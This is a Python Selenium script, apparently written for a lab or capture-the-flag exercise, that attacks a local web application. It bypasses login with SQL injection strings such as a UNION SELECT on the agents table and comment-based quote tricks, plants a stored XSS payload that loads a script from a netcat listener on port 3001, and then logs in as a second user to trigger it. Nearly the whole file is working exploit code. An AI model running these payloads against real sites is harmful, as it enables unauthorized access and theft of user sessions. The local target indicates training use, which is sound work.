from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
import subprocess
import time

def main():
    print("START NETCAT: LISTEN PORT 3001\n")
    netcat = subprocess.Popen(['nc', '-l', '3001'])


    try:
        driver = webdriver.Chrome()

        login_page = 'http://localhost:8080/login.php'
        driver.get(login_page)
        time.sleep(1)

        username = driver.find_element(By.NAME, 'username')
        username.send_keys("' UNION SELECT username, password FROM agents LIMIT 1#")
        username = driver.find_element(By.NAME, 'password')
        username.send_keys("everything' #")
        submit_button = driver.find_element(By.XPATH, "//input[@type='submit' and @class='btn btn-primary' and @value='Login']")
        submit_button.click()

        send_page = 'http://localhost:8080/send.php'
        driver.get(send_page)
        time.sleep(1)
        title = driver.find_element(By.NAME, 'title')
        title.send_keys("<script src='http://localhost:3001'></script>")
        inject_button = driver.find_element(By.XPATH, "//input[@type='submit' and @class='btn btn-primary' and @value='Send']")
        inject_button.click()

        logout_page = 'http://localhost:8080/logout.php'
        driver.get(logout_page)
        time.sleep(2)

        #Login with other user
        login_page = 'http://localhost:8080/login.php'
        driver.get(login_page)
        time.sleep(1)

        username = driver.find_element(By.NAME, 'username')
        username.send_keys("agentX'#")
        username = driver.find_element(By.NAME, 'password')
        username.send_keys("everything' #")
        submit_button = driver.find_element(By.XPATH, "//input[@type='submit' and @class='btn btn-primary' and @value='Login']")
        submit_button.click()

        report_page = 'http://localhost:8080/report.php'
        driver.get(report_page)
    
    except Exception as e:
        print(f"Error: {e}")
    
    finally:
        driver.quit()
        netcat.terminate()
        netcat.wait()

if __name__ == "__main__":
    main()